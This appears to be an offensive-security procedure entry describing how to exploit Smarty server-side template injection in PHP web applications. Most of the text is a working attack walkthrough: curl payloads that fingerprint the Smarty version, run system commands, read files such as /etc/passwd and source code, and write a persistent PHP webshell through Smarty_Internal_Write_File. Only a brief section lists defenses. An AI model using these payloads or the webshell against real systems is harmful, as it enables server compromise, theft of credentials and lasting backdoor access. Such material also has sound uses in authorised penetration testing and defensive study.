---
id: dfd3bbbf-ca7b-4bb4-93a1-6717f5bcb105
name: Command-Execution-and-File-Manipulation-via-Smarty-Template-Injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:40.255189+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[PowerShell]]'
sub_techniques: []
tags:
  - ssti
  - smarty
  - rce
  - file-manipulation
commands:
  - '[[commands/curl-send-smarty-payload]]'
platforms:
  - Web
  - PHP
tools:
  - '[[tools/Burp-Suite]]'
validated: true
---

# Command-Execution-and-File-Manipulation-via-Smarty-Template-Injection

## Summary

This procedure exploits Server-Side Template Injection (SSTI) vulnerabilities in applications using the Smarty template engine to achieve remote command execution (RCE) and file manipulation on the server. By injecting malicious Smarty payloads into unsanitized user input fields processed by templates, an attacker can execute system commands, read sensitive files, or write arbitrary files, potentially leading to full server compromise.

## Description

Server-Side Template Injection occurs when user-supplied input is interpolated into a template without proper sanitization, allowing execution of arbitrary code in the context of the web application. Smarty, a PHP-based template engine, is vulnerable to SSTI if inputs are directly embedded in templates. Attackers typically identify injection points through reflected output in web forms, search parameters, or error messages. Once confirmed, payloads can leverage Smarty's built-in functions for command execution (e.g., {system()}) or class methods for file operations. This technique is effective against legacy Smarty versions (pre-v3 for {php} tags) and modern ones using alternative methods like direct class invocation. The target environment is typically a PHP web application on Linux/Unix servers, where file system access can reveal configuration files, credentials, or enable persistence via webshell creation. Expected outcomes include command output in HTTP responses, file contents displayed, or new files created for backdoor access.

## Requirements

1. Network access to the vulnerable web application (e.g., via HTTP/HTTPS).
2. Identification of an input field reflected in Smarty-rendered output (e.g., via Burp Suite or manual testing).
3. Knowledge of the server's operating system (assumed Linux/Unix for command examples).
4. Tools like curl or Burp Suite for payload delivery.
5. Optional: Proxy interception capabilities to capture and modify requests.

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all user inputs before passing to template engines; use whitelisting for allowed characters.
- Update Smarty to the latest version and disable dangerous tags like {php} in configuration (e.g., set $security_policy to restrict functions).
- Implement Web Application Firewall (WAF) rules to block common SSTI patterns (e.g., {system, {php}).
- Enable application logging for template rendering errors and monitor for anomalous HTTP responses containing command output.
- Use least-privilege principles for the web server process to limit impact of RCE (e.g., containerization or chroot jails).

## Objectives

1. Confirm Smarty version and injection point to tailor payloads.
2. Achieve remote command execution to gather system information or exfiltrate data.
3. Manipulate files, such as reading sensitive configs or writing a persistent webshell.
4. Maintain access or escalate privileges based on executed commands.

## Instructions

### Step 1: Identify and Confirm Injection Point

**Context**: Locate a user-controlled input that is rendered via Smarty templates, such as a search box or profile field. Test for injection by submitting a benign payload like 'test' and checking if it's reflected unsanitized.

**Command** ([[commands/curl-send-smarty-payload]]):
```bash
curl -X POST -d "input={%24smarty.version}" http://target.com/vulnerable-endpoint
```

> This sends a payload to retrieve the Smarty version, confirming the engine and potential for SSTI. If the response includes the version (e.g., "Smarty-3.1.32"), the injection is viable. For GET parameters, use -d "?param={%24smarty.version}". Expected output: HTTP response body containing the Smarty version string.

### Step 2: Execute Arbitrary Commands

**Context**: Use compatible payloads to run system commands. For Smarty v3+, avoid deprecated {php} tags and use {system()} or similar. This step demonstrates basic reconnaissance like checking user ID.

Reference the payloads in [[codes/Smarty-SSTI-Payloads-for-Command-Execution-and-File-Write]]. Inject via the confirmed endpoint.

**Command** ([[commands/curl-send-smarty-payload]]):
```bash
curl -X POST -d "input={system('id')}" http://target.com/vulnerable-endpoint
```

> Submits a payload to execute the 'id' command. URL-encode special characters if needed (e.g., {system('id')} becomes {system(%27id%27)). Expected output: Response includes output like "uid=33(www-data) gid=33(www-data) groups=33(www-data)".

### Step 3: Read Sensitive Files

**Context**: Leverage command execution to cat or display file contents, targeting configs like /etc/passwd or application secrets.

Reference the payloads in [[codes/Smarty-SSTI-Payloads-for-Command-Execution-and-File-Write]].

**Command** ([[commands/curl-send-smarty-payload]]):
```bash
curl -X POST -d "input={system('cat index.php')}" http://target.com/vulnerable-endpoint
```

> Executes 'cat index.php' to reveal source code. Adjust path as needed (e.g., 'cat /etc/passwd'). Expected output: Response body contains the file contents, potentially exposing credentials or logic.

### Step 4: Write Files for Persistence

**Context**: Use Smarty's file writing capabilities to create a webshell, enabling future command execution without reinjecting.

Reference the payloads in [[codes/Smarty-SSTI-Payloads-for-Command-Execution-and-File-Write]].

**Command** ([[commands/curl-send-smarty-payload]]):
```bash
curl -X POST -d "input={Smarty_Internal_Write_File::writeFile(%24SCRIPT_NAME,%22<?php passthru($_GET[cmd]); ?>%22,self::clearConfig())} " http://target.com/vulnerable-endpoint
```

> Writes a PHP webshell to the current script's location. Access via http://target.com/vulnerable-endpoint?cmd=whoami afterward. Expected output: No visible change in response, but verify by accessing the new endpoint with a test command. Success if command executes.
